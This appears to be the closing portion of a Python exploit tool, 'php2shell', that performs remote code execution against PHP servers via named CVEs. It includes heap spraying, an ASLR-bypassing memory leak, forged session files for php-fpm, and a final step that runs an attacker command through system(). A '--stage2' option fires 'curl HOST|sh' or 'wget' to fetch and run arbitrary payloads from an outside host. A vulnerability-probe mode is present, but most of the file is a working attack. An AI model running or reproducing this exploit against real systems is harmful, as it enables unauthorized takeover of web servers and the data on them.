                f.write(block if take == len(block) else block[:take])
                remaining -= take
            f.write(b'";')
        try: os.chmod(p, 0o666)
        except OSError: pass
        self._fixup_perms(p)
        return p
    def arm(self, sid, arm_path=None):
        """Request A: trigger session_start OOM in the FPM child.

        Preferred ("get" shape): bodiless GET to a path whose application
        code calls `session_start()`. The OOM is rendered in-band, the child
        survives, and the heap state is the one the dispatch geometry was
        measured on. Pass `arm_path` pointing to such an endpoint.

        Fallback ("post" shape): multipart POST with PHP_SESSION_UPLOAD_PROGRESS;
        the rfc1867 callback starts the session pre-RINIT. Decode OOMs the
        same file but under a *different* heap state (multipart scratch alive)
        AND the fatal happens during Request Startup, which FPM typically
        treats as a worker crash -> worker killed -> fresh ASLR. Only works
        when the application doesn't itself call session_start()."""
        if arm_path:
            hdr = (f"GET {arm_path} HTTP/1.1\r\nHost: {self.t.host_header}\r\n"
                   f"Cookie: PHPSESSID={sid}\r\nConnection: close\r\n\r\n").encode()
            self.t.reset(); s = self.t._conn(); s.settimeout(self.t.timeout)
            s.sendall(hdr)
            try: return self.t._read_one(s)
            except Exception: return b""
        parts = [{"name": "PHPSESSID", "data": sid.encode()},
                 {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"arm"},
                 {"name": "f", "filename": "a.txt", "data": b"A" * 65536}]
        return self.t.post(multipart(parts, b"B" * 17), b"B" * 17, timeout=30, extra_headers=None)
    def equalise(self, n):
        """2N benign GETs. Reconnects per request so each child sees the same prelude."""
        hdr = (f"GET {self.t.path} HTTP/1.1\r\nHost: {self.t.host_header}\r\n"
               f"Connection: close\r\n\r\n").encode()
        for _ in range(n):
            self.t.reset()
            s = self.t._conn(); s.sendall(hdr)
            try: self.t._read_one(s)
            except Exception: pass
            self.t.reset()
    def _write_session(self, sid, sys_addr):
        """Local-FS write of the serialized session (operator must have fs access).

        chmod 0666 because PHP's session files handler opens O_RDWR."""
        if not self.session_dir: raise RuntimeError("no --fpm-session-dir; cannot plant session blob")
        p = os.path.join(self.session_dir, f"sess_{sid}")
        with open(p, "wb") as f: f.write(ce_session_blob(sys_addr))
        try: os.chmod(p, 0o666)
        except OSError: pass
        self._fixup_perms(p)
        return p
    def consume(self, sid):
        """Dispatch: byte-exact multipart POST that reclaims the stale struct.
        Returns the HTTP response (preview = app's own stdout, which for a
        successful fire is the command text handed to system)."""
        import secrets
        value, meta = ce_poison_value(self.fam, self.chunk, self.exe, self.libc)
        bnd = ("X4B%06x" % secrets.randbits(24)).encode()
        body = b"".join([
            b"--", bnd, b"\r\nContent-Disposition: form-data; name=\"s\"\r\n\r\n", value, b"\r\n",
            b"--", bnd, b"\r\nContent-Disposition: form-data; name=\"c\"\r\n\r\n", self.cmd, b"\r\n",
            b"--", bnd, b"\r\nContent-Disposition: form-data; name=\"PHPSESSID\"\r\n\r\n", sid.encode(), b"\r\n",
            b"--", bnd, b"\r\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\nx\r\n",
            b"--", bnd, b"\r\nContent-Disposition: form-data; name=\"f\"; filename=\"z\"\r\n",
            b"Content-Type: application/octet-stream\r\n\r\nT\r\n--", bnd, b"--\r\n",
        ])
        # Head: byte-exact (NO User-Agent/Accept; they populate $_SERVER and move
        # the geometry the family offsets were measured on).
        head = (f"POST {self.t.path} HTTP/1.1\r\nHost: {self.t.host_header}\r\n"
                f"Cookie: PHPSESSID={sid}\r\n"
                f"Content-Type: multipart/form-data; boundary={bnd.decode()}\r\n"
                f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode()
        self.t.reset(); s = self.t._conn(); s.settimeout(self.t.timeout)
        s.sendall(head); s.sendall(body)
        try: return self.t._read_one(s), meta
        except Exception: return b"", meta
    def run(self, workers=1, attempts=0, arm_path=None):
        """Full chain: pre-plant huge-arm-session → arm (OOM, child survives) →
        equalise → plant poison-session → consume (reclaim + fire).

        TWO SIDs are used:
          arm_sid     carries the huge-string session file (triggers OOM)
          consume_sid carries `a|i:<sys_addr>;` (feeds the write primitive)

        `arm_path` names an endpoint whose application code calls
        `session_start()` — required for the in-band fatal shape that leaves
        the child alive. Without it the fallback (upload_progress) is used,
        which typically kills the FPM worker and voids the chain."""
        if attempts == 0: attempts = max(2, workers + 1)
        _, meta = ce_poison_value(self.fam, self.chunk, self.exe, self.libc)
        arm_sid = ce_sid()
        consume_sid = ce_sid()
        if not self.session_dir:
            return {"receipt": False, "error": "no --fpm-session-dir; cannot plant arm/consume blobs", "meta": meta}
        # Plant the huge arm file (session_start on this SID OOMs)
        self._write_arm_session(arm_sid)
        # Fire arm: OOM leaves BG(unserialize).data dangling
        arm_resp = self.arm(arm_sid, arm_path=arm_path)
        armed = b"Allowed memory size" in (arm_resp or b"")
        if workers > 1: self.equalise(2 * workers)
        # Plant the poison blob at consume_sid for consume's session_start to parse
        self._write_session(consume_sid, int(meta["system"], 16))
        for i in range(attempts):
            resp, _ = self.consume(consume_sid)
            if resp and self.cmd[:16] in resp:
                return {"receipt": True, "attempt": i + 1, "preview": resp[:200], "meta": meta,
                        "arm_sid": arm_sid, "consume_sid": consume_sid, "armed": armed}
        return {"receipt": False, "attempts": attempts, "meta": meta,
                "arm_sid": arm_sid, "consume_sid": consume_sid, "armed": armed}

# --------------------------------------------------------------------- spray driver
def _mkexp(url, cmd, zif, dtor, htdata, huge, arm_mode="bigfield"):
    return Exploit(KA(url), cmd, zif, dtor, htdata, huge, arm_mode=arm_mode)

def spray_phase(url, fn_name, zif, dtor, htdata, huge, nthreads, timeout, arm_mode="bigfield"):
    res = {"v": 0}; stop = threading.Event(); dl = time.time() + timeout
    def w():
        ex = _mkexp(url, "x", zif, dtor, htdata, huge, arm_mode=arm_mode)
        while not stop.is_set() and time.time() < dl:
            try: v = getattr(ex, fn_name)()
            except Exception: v = 0
            if v: res["v"] = res["v"] or v; stop.set(); return
            ex.t.reset()
    ths = [threading.Thread(target=w, daemon=True) for _ in range(nthreads)]
    for x in ths: x.start()
    while time.time() < dl and not stop.is_set(): time.sleep(0.1)
    stop.set(); return res["v"]

# htdata-derivation delta per PHP major series: (first in-chunk ptr target at
# leak[0x38]) - htdata is constant within a series. Verified on 8.3.35, 8.4.26,
# 8.5.11. See scratchpad/htdata_derive.py for the empirical derivation.
HTDATA_DELTA = {"8.3": 0x3dfc8, "8.4": 0x3dfc8, "8.5": 0x28fc8}

def derive_htdata(url, zif, dtor, huge, series, timeout=30):
    """Run stage1 serially; derive htdata from the leak's first in-chunk pointer.
    Returns htdata (int) or None if not derivable."""
    delta = HTDATA_DELTA.get(series)
    if delta is None: return None
    t = KA(url); ex = Exploit(t, "x", zif, dtor, 0, huge); ex.t.timeout = timeout
    for _ in range(5):
        try:
            base = ex.stage1()  # populates ex.last_leak, ex.last_chunk
            if not base: ex.t.reset(); continue
            raw, cb = ex.last_leak, ex.last_chunk
            # first in-chunk pointer (expected at leak[0x38])
            for i in range(0, len(raw) - 8, 8):
                v = int.from_bytes(raw[i:i + 8], "little")
                if cb <= v < cb + 0x200000:
                    return v - cb - delta
            ex.t.reset()
        except Exception: ex.t.reset()
    return None

def probe_vulnerable(url, zif, dtor, huge, attempts=3, timeout=30):
    """Behavioral vulnerability probe. Returns (verdict, reason):
      verdict in {"vulnerable", "patched", "unknown"}
    Runs stage1 up to `attempts` times serially. If any attempt produces an
    oversized Set-Cookie dump, the target is behaviorally vulnerable (not just
    version-string-vulnerable). Distinguishes backport-patched builds that
    report a vulnerable version string from actually-vulnerable builds."""
    t = KA(url); t.timeout = timeout
    ex = Exploit(t, "x", zif, dtor, 0, huge)
    reasons = []
    for i in range(attempts):
        try:
            base, reason = ex.stage1_diag()
            if base:
                return "vulnerable", f"stage1 leaked (chunk base {base:#x})"
            reasons.append(reason)
            ex.t.reset()
        except Exception as e:
            reasons.append(f"exception: {type(e).__name__}: {e}"[:80])
            ex.t.reset()
    # Classify failure
    joined = " / ".join(reasons[:3])
    # If OOM never fired across all attempts: likely patched (layer-3 post_max_size
    # enforcement, or layer-2 delayed OOM, or memory_limit mismatch)
    if all("OOM did not fire" in r or "chunked" in r.lower() for r in reasons):
        return "patched", f"OOM never triggered across {attempts} attempts ({joined})"
    # If OOM fired but forge never reclaimed: likely patched (layer-1 php_rinit_session_globals)
    # OR pre-8.3.22 heap layout
    if any("normal session ID" in r for r in reasons):
        return "patched", f"OOM fired but forge did not reclaim PS(id) slot: likely layer-1 fix or pre-8.3.22 heap ({joined})"
    # Partial reclaims or no heap pointers: unclear
    return "unknown", f"inconclusive ({joined})"

def probe_oom(url, start_mb, zif, dtor, max_mb=200):
    t = KA(url); ex = Exploit(t, "x", zif, dtor, 0, 8); mb = 8
    while mb <= max_mb:
        ex.huge = mb
        parts = [{"name": f"f{i:04d}"[:5], "data": b"x"} for i in range(1001)]
        parts += [{"name": "PHPSESSID", "data": b"\x00"}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}, ex._file(), ex._big()]
        if b"Allowed memory size" in t.post(multipart(parts, b"S" * 17), b"S" * 17, timeout=90): return mb
        mb = mb * 2 if mb < 64 else mb + 64
    return None

def main():
    ap = argparse.ArgumentParser(description="php2shell — self-contained CVE-2026-109618/9 exploit")
    ap.add_argument("-u", "--url", required=True)
    ap.add_argument("-c", "--cmd", default="id>/tmp/x", help="raw command (<=14 bytes)")
    ap.add_argument("--stage2", metavar="HOST", help="fire 'curl HOST|sh' (<=14B) for arbitrary payload")
    ap.add_argument("--fetcher", default="curl", choices=("curl", "wget"))
    ap.add_argument("--container", default="", help="(lab) docker name: offset derive + proof read")
    ap.add_argument("--sury", action="store_true", help="target runs Sury PPA build (apt.sury.org)")
    ap.add_argument("--htdata", type=lambda x: int(x, 0), default=None, help="override htdata offset")
    ap.add_argument("--huge", type=int, default=0, help="OOM field MB (0=adaptive)")
    ap.add_argument("--threads", type=int, default=20)
    ap.add_argument("--timeout", type=int, default=90, help="per-phase spray budget (s)")
    ap.add_argument("--probe-only", action="store_true", help="behavioral vulnerability probe + exit; no exploitation")
    ap.add_argument("--force", action="store_true", help="skip version-string patched check (useful for suspected backports)")
    ap.add_argument("--arm", choices=("bigfield", "nested"), default="bigfield",
                    help="arm variant: 'bigfield' (default, 1001 fields + big) or 'nested' "
                         "(MartinPham-style deep-nested array names; try when post_max_size/413 blocks bigfield)")
    # Chain-E (FPM). Ported from dinosn/php-cve-2026-10961x-lab-poc (MIT).
    ap.add_argument("--fpm", action="store_true", help="use Chain-E against php-fpm (requires --fpm-pid or explicit bases + --fpm-session-dir)")
    ap.add_argument("--fpm-pid", type=int, default=0, help="php-fpm child PID; parses /proc/<PID>/maps for bases")
    ap.add_argument("--fpm-maps-file", default="", help="path to a saved /proc/<pid>/maps rendering")
    ap.add_argument("--fpm-exe", type=lambda x: int(x, 0), default=0, help="php-fpm image base (overrides maps)")
    ap.add_argument("--fpm-libc", type=lambda x: int(x, 0), default=0, help="libc.so.6 base (overrides maps)")
    ap.add_argument("--fpm-chunk", type=lambda x: int(x, 0), default=0, help="Zend MM chunk base (overrides maps)")
    ap.add_argument("--fpm-session-dir", default="", help="local path to session storage dir (writes sess_<SID>)")
    ap.add_argument("--fpm-workers", type=int, default=1, help="pool width (controls equalise count)")
    ap.add_argument("--fpm-attempts", type=int, default=0, help="dispatch attempts (0 = max(2, workers+1))")
    ap.add_argument("--fpm-ml", type=int, default=64, help="target's PHP memory_limit in MiB (sizes the arm session file; default 64)")
    ap.add_argument("--fpm-docker", default="", help="LAB-ONLY: docker container name; chowns planted session files to www-data via `docker exec` so the FPM worker can open them (bypass bind-mount cross-UID access quirks)")
    ap.add_argument("--fpm-arm-path", default="", help="URL path to the application endpoint that calls session_start() (required for in-band OOM; without this the fallback upload_progress arm kills the worker)")
    a = ap.parse_args()

    if a.stage2:
        a.cmd = (f"curl {a.stage2}|sh" if a.fetcher == "curl" else f"wget -qO-{a.stage2}|sh")
        if len(a.cmd) > 14:
            print(f"[-] bootstrap {a.cmd!r} is {len(a.cmd)}B > 14B; use a shorter host"); return 1
        print(f"[*] stage2 bootstrap: {a.cmd!r} ({len(a.cmd)}B)")
    # cmd length check: _fake_ht has a 167-byte buffer with the cmd at offset 0x98+len+null.
    # The hard cap (167-0x98-1 = 102) is less strict than the operational cap (14 bytes,
    # dictated by the 192-bin reclaim target size — see WRITEUP §"Command length cap").
    if len(a.cmd.encode()) > 14:
        print(f"[-] cmd {a.cmd!r} is {len(a.cmd.encode())}B > 14B operational cap.")
        print(f"    Use --stage2 <short-domain> to bootstrap longer payloads via `curl HOST|sh`.")
        return 1

    ver, arch = detect(a.url, a.container)
    if not ver: print("[-] could not detect PHP version"); return 1
    # patched floors (fix landed in these; >= => not vulnerable). cross-ref CVE advisories/neko.
    FIXED_FLOOR = {"8.2": "8.2.35", "8.3": "8.3.36", "8.4": "8.4.27", "8.5": "8.5.12"}
    br = ".".join(ver.split(".")[:2]); floor = FIXED_FLOOR.get(br)
    if floor and tuple(int(x) for x in ver.split(".")) >= tuple(int(x) for x in floor.split(".")):
        if a.force:
            print(f"[!] PHP {ver} reports as PATCHED (fix landed in {floor}) but --force set; proceeding anyway.")
        else:
            print(f"[-] PHP {ver} is PATCHED (fixed in {floor}) — not vulnerable to php2shell.")
            print(f"    If you suspect backport-patched behavior and want to behaviorally probe, use --force --probe-only.")
            return 3
    # grooming boundary: heap layout shift in 8.3.22 means stage1 leak fails on < 8.3.22
    GROOM_FLOOR = {"8.3": "8.3.22"}
    gf = GROOM_FLOOR.get(br)
    if gf and tuple(int(x) for x in ver.split(".")) < tuple(int(x) for x in gf.split(".")):
        print(f"[-] PHP {ver} is vulnerable but grooming fails (heap layout < {gf}). Needs grooming port."); return 4

    # --- Chain-E (FPM) branch — ported from dinosn/php-cve-2026-10961x-lab-poc (MIT)
    if a.fpm:
        fam = ce_family(ver)
        if not fam: print(f"[-] no Chain-E family for {ver}"); return 1
        print(f"[*] Chain-E family {fam.get('version')} ({fam['source']}, status={fam.get('status','?')})")
        if fam.get("status") == "patched" and not a.force:
            print(f"[-] {ver} is the Chain-E patched line (bailout leaves no stale state). Use --force to try anyway."); return 3
        chunk, exe, libc = a.fpm_chunk, a.fpm_exe, a.fpm_libc
        if not (chunk and exe and libc):
            if not (a.fpm_pid or a.fpm_maps_file):
                print(f"[-] Chain-E needs bases: pass --fpm-pid <child-pid> or explicit --fpm-exe/libc/chunk"); return 1
            try:
                text = open(a.fpm_maps_file).read() if a.fpm_maps_file else open(f"/proc/{a.fpm_pid}/maps").read()
            except OSError as e: print(f"[-] cannot read maps: {e}"); return 1
            parsed = ce_parse_maps(text)
            chunk = chunk or parsed["chunk"]; exe = exe or parsed["exe"]; libc = libc or parsed["libc"]
            missing = [k for k, v in (("chunk", chunk), ("exe", exe), ("libc", libc)) if not v]
            if missing: print(f"[-] missing bases from maps: {missing}"); return 1
            print(f"[*] bases from {'maps-file' if a.fpm_maps_file else f'/proc/{a.fpm_pid}/maps'}: "
                  f"chunk={chunk:#x} exe={exe:#x} libc={libc:#x}")
        else:
            print(f"[*] bases from flags: chunk={chunk:#x} exe={exe:#x} libc={libc:#x}")
        if not a.fpm_session_dir:
            print(f"[!] no --fpm-session-dir; the dispatch assumes the a|i:<system>; blob is already"); print(f"    written to {{session_dir}}/sess_<SID> by some other means. Expect no receipt otherwise.")
        ex = ExploitFPM(KA(a.url), a.cmd, fam, chunk, exe, libc,
                        session_dir=a.fpm_session_dir or None,
                        memory_limit_mib=a.fpm_ml,
                        docker_container=a.fpm_docker or None)
        result = ex.run(workers=a.fpm_workers, attempts=a.fpm_attempts, arm_path=a.fpm_arm_path or None)
        meta = result["meta"]
        print(f"[*] value val={meta['val']:#x} target={meta['target']} system={meta['system']} "
              f"used_slots={meta['used_slots']}")
        if result["receipt"]:
            print(f"[+] receipt on attempt {result['attempt']}: {result['preview'][:120]!r}"); return 0
        print(f"[-] no receipt after {result['attempts']} attempts (fresh-child reset per attempt expected on FPM)")
        return 1
    sury = a.sury
    if not sury and a.container:
        r = subprocess.run(["docker", "exec", a.container, "sh", "-c",
                            "ls /usr/lib/apache2/modules/libphp8.*.so 2>/dev/null"],
                           capture_output=True, text=True, timeout=5)
        if r.stdout.strip():
            sury = True; print("[*] detected Sury PPA build (versioned libphp)")
    key = ver if ver in PROFILES else SERIES_DEFAULT.get(".".join(ver.split(".")[:2]))
    prof = dict(PROFILES.get(key) or {})
    if not prof: print(f"[-] no profile for {ver}"); return 1
    if a.htdata is not None: prof["htdata"] = a.htdata
    if sury:
        sury_key = f"sury-{ver}"
        off = OFFSETS.get(arch, {}).get(sury_key)
        if not off:
            sury_key = f"sury-{key}"
            off = OFFSETS.get(arch, {}).get(sury_key)
        if off:
            print(f"[*] using Sury PPA offsets ({sury_key})")
        elif a.container:
            off = elf_offsets(a.container)
        if prof["htdata"] is not None and a.htdata is None:
            print(f"[!] Sury htdata is uncalibrated; Docker htdata may not work. Use --htdata to override.")
            prof["htdata"] = None
    else:
        off = elf_offsets(a.container) if a.container else OFFSETS.get(arch, {}).get(ver) or OFFSETS.get(arch, {}).get(key)
    if not off: print(f"[-] no offsets for {arch}/{ver}; pass --container or --sury"); return 1
    zif, dtor = off
    print(f"[*] {a.url}  PHP {ver}/{arch}  profile {key}  reclaim {prof['s3']}{' (sury)' if sury else ''}")
    print(f"[*] zif=0x{zif:x} dtor=0x{dtor:x} htdata={prof['htdata'] and hex(prof['htdata'])}")

    huge = a.huge or probe_oom(a.url, prof["huge"], zif, dtor)
    if not huge: print("[-] could not trigger OOM"); return 1
    print(f"[*] OOM field = {huge}MB")

    if a.probe_only:
        print(f"[*] running behavioral vulnerability probe...")
        verdict, reason = probe_vulnerable(a.url, zif, dtor, huge, attempts=3, timeout=30)
        if verdict == "vulnerable":
            print(f"[+] VULNERABLE: {reason}")
            return 0
        elif verdict == "patched":
            print(f"[-] PATCHED (behaviorally): {reason}")
            print(f"    Note: version string reported {ver} — may be backport-patched.")
            return 3
        else:
            print(f"[?] UNKNOWN: {reason}")
            return 1

    chunk = spray_phase(a.url, "stage1", zif, dtor, 0, huge, a.threads, a.timeout, arm_mode=a.arm)
    if not chunk:
        print("[-] stage1 heap leak failed. Diagnosing one serial attempt...")
        try:
            t = KA(a.url); ex = Exploit(t, "x", zif, dtor, 0, huge)
            _, reason = ex.stage1_diag()
            print(f"    reason: {reason}")
        except Exception as e:
            print(f"    diag failed: {e}")
        return 1
    print(f"[+] chunk base  = {chunk:#x}")
    libphp = spray_phase(a.url, "stage2", zif, dtor, 0, huge, a.threads, a.timeout, arm_mode=a.arm)
    if not libphp:
        print("[-] stage2 libphp leak failed.")
        print(f"    stage1 worked (chunk base known) but stage2 reclaim/leak did not fire.")
        print(f"    Possible: dtor_offset ({dtor:#x}) wrong for this build, or memory_limit/post_max_size interfering.")
        return 1
    print(f"[+] libphp base = {libphp:#x}  (in-band, HTTP only)")

    if prof["htdata"] is None:
        series = ver.rsplit(".", 1)[0] if ver else None
        print(f"[*] no profile htdata; trying dynamic derivation (series={series})...")
        derived = derive_htdata(a.url, zif, dtor, huge, series, timeout=a.timeout)
        if derived is None:
            print(f"[!] leak-only: no htdata for {key} and dynamic derivation failed. ASLR bypass proven; RCE needs htdata.")
            return 2
        print(f"[+] derived htdata = {derived:#x}")
        prof["htdata"] = derived

    HT, ZIFA = chunk + prof["htdata"], libphp + zif
    out = a.cmd.split(">")[-1].strip() if ">" in a.cmd else None
    if a.container and out:
        subprocess.run(["docker", "exec", a.container, "sh", "-c", f"rm -f {out}"], capture_output=True)
    stop = threading.Event(); dl = time.time() + a.timeout; n = [0]
    errs = Counter()  # classified failure counts for diagnostics
    def fire():
        ex = _mkexp(a.url, a.cmd, zif, dtor, prof["htdata"], huge, arm_mode=a.arm); ex.zif = ZIFA
        while not stop.is_set() and time.time() < dl:
            try:
                ex.stage3_9bie(HT) if prof["s3"] == "9bie" else ex.stage3_nb(HT)
            except IndexError:
                errs["IndexError (cmd too long for fake_ht?)"] += 1
            except (ConnectionError, OSError, TimeoutError) as e:
                errs[f"network: {type(e).__name__}"] += 1
            except Exception as e:
                errs[f"other: {type(e).__name__}: {e}"[:80]] += 1
            n[0] += 1
    ths = [threading.Thread(target=fire, daemon=True) for _ in range(a.threads)]
    for x in ths: x.start()
    proof = ""
    while time.time() < dl:
        if a.container and out:
            proof = subprocess.run(["docker", "exec", a.container, "sh", "-c", f"cat {out} 2>/dev/null"],
                                   capture_output=True, text=True).stdout.strip()
            if proof: break
        time.sleep(0.5)
    stop.set()
    if proof:
        print(f"[+] RCE: {proof}"); return 0
    # Diagnose: if nearly every fire raised an exception, something's wrong with the payload
    err_total = sum(errs.values())
    if a.stage2:
        if err_total > 0 and err_total > n[0] * 0.5:
            print(f"[-] stage2 bootstrap fired {n[0]-err_total}x successfully but {err_total}x failed.")
            for e, cnt in errs.most_common(3): print(f"    {cnt}x {e}")
            return 1
        print(f"[*] fired 'curl {a.stage2}|sh' {n[0]}x (blind) — watch your stage-2 server / listener."); return 0
    print(f"[-] no confirmed execution ({n[0]} fires; blind if no --container)")
    if err_total > 0:
        print(f"    {err_total}/{n[0]} fires raised exceptions:")
        for e, cnt in errs.most_common(3): print(f"      {cnt}x {e}")
        if err_total > n[0] * 0.8:
            print(f"    >80% of fires errored — exploit payload or network is broken. Not a reclaim-timing issue.")
    return 1

if __name__ == "__main__":
    sys.exit(main())
